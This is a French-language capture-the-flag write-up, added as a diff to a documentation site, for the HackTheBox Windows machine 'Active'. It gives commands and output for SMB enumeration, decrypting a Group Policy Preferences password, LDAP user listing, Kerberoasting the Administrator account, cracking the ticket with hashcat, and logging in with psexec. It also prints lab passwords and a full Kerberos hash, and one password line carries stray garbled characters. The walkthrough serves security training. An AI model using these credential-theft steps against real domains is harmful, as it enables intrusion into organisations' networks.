@@ -1,0 +1,175 @@
+---
+title: Active
+tableOfContents: false
+---
+
+import { Aside } from '@astrojs/starlight/components';
+
+
+<center>
+    <img src="active.png" width="150px"/>
+</center>
+
+Active est une machine HackTheBox Windows facile qui permet de pratiquer deux méthodes classiques de compromission de l'Active Directory.
+
+# Reconnaissance
+
+## Port Scan
+
+Classiquement, on commence par un scan de port avec Nmap :
+
+```bash
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-22 17:58:11Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49162/tcp open  msrpc         Microsoft Windows RPC
+49167/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+
+```
+
+Celui-ci nous apprend que nous sommes très certainement sur un DC Active Directory avec la présence de LDAP, Kerberos, SMB, et d'un serveur DNS. 
+
+On apprend également que le domaine est ACTIVE.HTB.
+
+Après un rapide test, on ne peut pas requêter le LDAP sans identifiants. On passe donc directement au SMB.
+
+## SMB
+
+On voit que l'identification anonyme est possible sur la machine, nous allons donc énumérer les shares : 
+
+```bash
+            
+[+] IP: 10.129.25.207:445	Name: active.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	NO ACCESS	Logon server share 
+	Replication                                       	READ ONLY	
+	SYSVOL                                            	NO ACCESS	Logon server share 
+	Users                                             	NO ACCESS	
+[-] Closing connections..                                                                                      
+```
+
+Nous avons les droits de lecture sur Replication.
+
+### Group Policy Preference
+
+<Aside type="note">
+Les GPP sont des fichiers de configuration pouvant contenir des utilisateurs et mots de passe. Le problème étant que le mot de passe est chiffré avec une clé fournie par Microsoft. 
+</Aside>
+
+Dans Replication, on trouve un fichier XML qui est une GPP. nous allons donc utiliser l'outil [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) pour déchiffrer les identifiants.
+
+```bash
+pip install gpp-decrypt
+
+gpp-decrypt -f ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+
+                              __                                __ 
+  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
+ / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
+ \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
+/___/  /_/    /_/                                /___/  /_/         
+
+[ • ] GPP-Decrypt v2.0.0 - Group Policy Preferences Password Decryptor
+[ • ] Author: Kristof Toth (@t0thkr1s)
+
+[ • ] Processing file: ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+[ ✓ ] Found 1 credential(s)
+
+═══ Credential #1 ═══
+[ • ] Type: User Account
+[ • ] Username: active.htb\SVC_TGS
+[ ✓ ] Password: GPPstillStandingStrong2k18ఌఌఌఌఌఌ
+
+```
+
+Avec cet utilisateur on peut se connecter via PSExec et récupérer le premier flag. 
+
+# Foothold
+
+# Escalade de privilège
+
+## Enumeration 
+
+### Users
+
+Une fois que nous avons notre utilisateur, nous allons énumérer le LDAP :
+
+```bash
+nxc ldap active.htb  -u SVC_TGS -p 'GPPstillStandingStrong2k18' --users
+LDAP        10.129.25.207   389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.25.207   389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+LDAP        10.129.25.207   389    DC               [*] Enumerated 4 domain users: active.htb
+LDAP        10.129.25.207   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.129.25.207   389    DC               Administrator                 2018-07-18 15:06:40 0        Built-in account for administering the computer/domain      
+LDAP        10.129.25.207   389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
+LDAP        10.129.25.207   389    DC               krbtgt                        2018-07-18 14:50:36 0        Key Distribution Center Service Account                     
+LDAP        10.129.25.207   389    DC               SVC_TGS                       2018-07-18 16:14:38 0    
+```
+
+## Keberoasting
+
+<Aside type="note">
+Les utilisateurs ayant le champ "Service Principal Name" (SPN) sont vulnérables à une attaque nommée Kerberoast. Ces utilisateurs ont un ticket TGS chiffré grâce à leur mot de passe, l'attaque consiste donc à demander un ticket TGS et à cracker le mot de passe hors ligne.
+</Aside>
+
+Avec les credentials de SVC_TGS, on va également vérifier s’il y a des utilisateurs vulnérables à une attaque par kerberoasting : 
+
+```bash
+nxc ldap active.htb  -u SVC_TGS -p 'GPPstillStandingStrong2k18' --kerberoasting output
+LDAP        10.129.25.207   389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.25.207   389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+LDAP        10.129.25.207   389    DC               [*] Skipping disabled account: krbtgt
+LDAP        10.129.25.207   389    DC               [*] Total of records returned 1
+LDAP        10.129.25.207   389    DC               [*] sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon: 2026-06-22 13:55:57.645332
+LDAP        10.129.25.207   389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$70bff1a6e8c432c5bc6d65542f16ae95$54e77660b5dcba5609451276b4136a9abd254e01931f9bafb27996e20779ced2464a0bc0053074feb08b3817a2233f4fafef779fc2d12bbf2b3c752c5c565b398e28dd0ed0eed579e27028637c11cfc1a7797626569177ef265fdde5b96a0625358a93836179f89658d83907987bca7f637364082f81133035bf927f5348015301a941e2d6f2290cc82e1370c92d3168bfbe5023049f850b874d18b30fd9f9fca7df77083bc4a06aaba535138080b12d49bb32d0727d74b169d8d095eafe4f8126baba4398c596b2f3eba9311fadb7b0959a3dbbeae1f85f64d8f25b68bc1b5e5d3eeb15d2c268ad0e6cd14ace030202c97988206bc3b70cd3de20c717adf6f3449f0aea5250cab1f7817fe64ef2610df24f04af3c36fdc0fb33e107de92e928cfd744a93ff0e8807fa20779ee18b02e0c45d3980ef64b5d75ee7ef01b3d9af887cdcd1d48d13c98523a8ab39bc32b4e067c62f2f19601e39329fb0ee00b7aaae6b99fa2bafb634ce8a13af632dcaeb91248ab3abbc74941d5ea37d8dc7e181c7c5328f75400aae86538629886230813a4e785265198aebb51c479c55e66b7945db31354876a8ed744baeb8386f65cc012fe628c5731ec29c701e4eba1ce2deae558845d55410d9a3b2c8c646b7f32833d85ed96096ce199c0982e969e4b6344d62f26dca1a93a061ef30aee75846230cded59de4f188f6b258ffc874cb01866bf5c50a505e239b75158d45846bf47fd19acf545255ade6db591f9549215d9f0dd2d7a13284756203d0b9fc76c20a3df9236936ec804a9b0774d22847ad692ccd53e1fcb419f13bd705afd0b6024687f3a8320895f705e969aacad6b651ad809d96e810fd967e56940d223d02d58e39a919cd8720e6d58a5480b2d027c6d6ad4a9cc823da3a96847ac21b4eabd07567a9d1b3624b9f79519bdf4a9a6012e45a245a341006734c02cfd9ddf6e07825a26b69653a3dbe763a12da7c5481a42a1fca9a2a25424cb7f5ffab002953c1d761ca07ae121d636776c8abc5360edc25fdeda69096202a3814a37c3035c7485711db4ecdb78eda070c088e15562b9d8b7336a62e5ad4e9ee00a695d3add420a5a3ab6edef5e0852273b66d1e872f6198f839ff95dd74bcbb00deb3a57b12d288edbae73be3ae01de22478c581e91568f50f0eaa1bc68dcf6c141260aaebb51a406645da8d06fe26e4725a3f055b53ab2a3011b43a47594a927bb046192ef50f96fba1b33936362d69c5e220
+
+```
+
+On voit que le compte Administrator est vulnérable, on va donc essayer de cracker le hash : 
+
+### Hashcat 
+
+```bash
+
+hashcat -a 0 -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt.gz
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$70bff1a6e8c432c5bc6d65542f16ae95$54e77660b5dcba5609451276b4136a9abd254e01931f9bafb27996e20779ced2464a0bc0053074feb08b3817a2233f4fafef779fc2d12bbf2b3c752c5c565b398e28dd0ed0eed579e27028637c11cfc1a7797626569177ef265fdde5b96a0625358a93836179f89658d83907987bca7f637364082f81133035bf927f5348015301a941e2d6f2290cc82e1370c92d3168bfbe5023049f850b874d18b30fd9f9fca7df77083bc4a06aaba535138080b12d49bb32d0727d74b169d8d095eafe4f8126baba4398c596b2f3eba9311fadb7b0959a3dbbeae1f85f64d8f25b68bc1b5e5d3eeb15d2c268ad0e6cd14ace030202c97988206bc3b70cd3de20c717adf6f3449f0aea5250cab1f7817fe64ef2610df24f04af3c36fdc0fb33e107de92e928cfd744a93ff0e8807fa20779ee18b02e0c45d3980ef64b5d75ee7ef01b3d9af887cdcd1d48d13c98523a8ab39bc32b4e067c62f2f19601e39329fb0ee00b7aaae6b99fa2bafb634ce8a13af632dcaeb91248ab3abbc74941d5ea37d8dc7e181c7c5328f75400aae86538629886230813a4e785265198aebb51c479c55e66b7945db31354876a8ed744baeb8386f65cc012fe628c5731ec29c701e4eba1ce2deae558845d55410d9a3b2c8c646b7f32833d85ed96096ce199c0982e969e4b6344d62f26dca1a93a061ef30aee75846230cded59de4f188f6b258ffc874cb01866bf5c50a505e239b75158d45846bf47fd19acf545255ade6db591f9549215d9f0dd2d7a13284756203d0b9fc76c20a3df9236936ec804a9b0774d22847ad692ccd53e1fcb419f13bd705afd0b6024687f3a8320895f705e969aacad6b651ad809d96e810fd967e56940d223d02d58e39a919cd8720e6d58a5480b2d027c6d6ad4a9cc823da3a96847ac21b4eabd07567a9d1b3624b9f79519bdf4a9a6012e45a245a341006734c02cfd9ddf6e07825a26b69653a3dbe763a12da7c5481a42a1fca9a2a25424cb7f5ffab002953c1d761ca07ae121d636776c8abc5360edc25fdeda69096202a3814a37c3035c7485711db4ecdb78eda070c088e15562b9d8b7336a62e5ad4e9ee00a695d3add420a5a3ab6edef5e0852273b66d1e872f6198f839ff95dd74bcbb00deb3a57b12d288edbae73be3ae01de22478c581e91568f50f0eaa1bc68dcf6c141260aaebb51a406645da8d06fe26e4725a3f055b53ab2a3011b43a47594a927bb046192ef50f96fba1b33936362d69c5e220:Ticketmaster1968
+
+```
+
+On trouve donc que le mot de passe de l’administrateur est Ticketmaster1968.
+
+# Root 
+
+On peut ensuite se connecter via PSExec et récupérer notre flag root.txt : 
+
+```bash
+impacket-psexec Administrator@active.htb
+```
